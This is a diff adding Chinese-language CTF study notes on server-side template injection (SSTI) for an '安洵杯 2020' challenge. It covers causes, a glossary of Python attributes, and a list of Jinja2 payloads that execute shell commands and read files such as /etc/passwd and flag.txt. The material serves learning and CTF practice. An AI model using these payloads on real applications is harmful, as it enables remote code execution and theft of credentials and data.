@@ -460,3 +460,88 @@ lipsum.__globals__.getitem[os].popen(cat flag).read()
  
 类似于这种
 ```
+
+# [安洵杯 2020]Normal SSTI
+>jianjian
+
+
+ssti学习：
+```
+SSTI 漏洞概述
+
+SSTI（Server-Side Template Injection，服务器端模板注入），主要发生在 Web 应用使用模板引擎动态渲染页面内容的场景中。当应用程序未对用户输入的内容进行严格过滤或转义，直接将用户可控数据嵌入到模板中进行解析渲染时，攻击者就可能通过构造恶意输入来注入模板代码，从而执行任意命令、读取敏感文件或获取服务器权限。
+
+模板引擎的设计初衷是将页面逻辑与数据展示分离，提高开发效率。常见的模板引擎包括 Python 的 Jinja2、Django Template，PHP 的 Smarty、Twig，Java 的 FreeMarker、Velocity，Node.js 的 EJS、Handlebars 等。
+SSTI 漏洞成因
+
+SSTI 漏洞的核心成因是用户输入未经过安全处理直接嵌入模板，具体可分为以下几种情况：
+
+    直接拼接用户输入到模板字符串：例如在 Python 中使用render_template_string("Hello, %s" % user_input)，若user_input包含模板语法，会被引擎解析执行。
+    模板路径 / 名称可控：攻击者通过控制模板文件路径，加载恶意模板文件或系统敏感文件（如/etc/passwd）。
+    模板变量赋值不当：将用户输入直接作为模板变量的值，且变量在模板中被以执行代码的方式调用（如{{ user_input }}在某些引擎中可执行表达式）。
+
+使用
+
+    输入{{ 7*7 }}，若页面返回49，说明模板引擎执行了表达式，可能存在漏洞。
+    输入{{ config }}（Jinja2），若返回配置信息，证明漏洞存在
+    读取配置文件：{{ config.items() }}（Jinja2）可获取应用配置，包括数据库账号密码等。
+    读取系统文件：在支持文件操作的引擎中，可通过{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}（Jinja2）读取/etc/passwd。
+控制结构 {% %} 可以声明变量，也可以执行语句
+变量取值 {{ }} 用于将表达式打印到模板输出
+注释块 {# #} 用于注释
+
+__class__
+  查看对象所在的类
+__mro__
+  查看继承关系和调用顺序，返回元组
+__base__
+  返回基类
+__bases__
+  返回基类元组
+__subclasses__()
+  返回子类列表
+__init__
+  调用初始化函数，可以用来跳到__globals__
+__globals__
+  返回函数所在的全局命名空间所定义的全局变量，返回字典
+__builtins__
+  返回内建内建名称空间字典
+__dic__
+  返回类的静态函数、类函数、普通函数、全局变量以及一些内置的属性
+__getitem__()
+  调用字典中的键值，比如a['b']，就是a.__getitem__('b')
+__import__
+  动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()]
+__str__()
+  返回描写这个对象的字符串，就是打印出来。
+
+```
+常规
+```
+# <class 'subprocess.Popen'>
+{{''.__class__.__base__.__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()[0].strip()}}
+
+# <class '_frozen_importlib._ModuleLock'>
+{{''.__class__.__base__.__subclasses__()[75].__init__.__globals__['__builtins__']['__import__']('os').listdir('/')}}
+
+# <class '_frozen_importlib.BuiltinImporter'>
+{{().__class__.__base__.__subclasses__()[80]["load_module"]("os").system("ls")}}
+
+# <class '_frozen_importlib_external.FileLoader'>
+{{().__class__.__base__.__subclasses__()[91].get_data(0, "app.py")}}
+
+# <class 'click.utils.LazyFile'>
+## 命令执行
+{{().__class__.__base__.__subclasses__().__getitem__(475).__init__.__globals__['os'].popen('ls').read()}}
+## 读文件
+{{().__class__.__base__.__subclasses__().__getitem__(475)('flag.txt').read()}}
+
+# <class 'warnings.catch_warnings'>
+{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].popen('ls').read() }}{% endif %}{% endfor %}
+{{"".__class__.__base__.__subclasses__()[189].__init__.__globals__['__builtins__'].popen('ls').read()}}
+
+```
+根据题目提示，要用/test/?url=来进行ssti攻击，测试{{7*7}}，发现被过滤了，测试{%print(1)%},这个没有被过滤
+
+
+
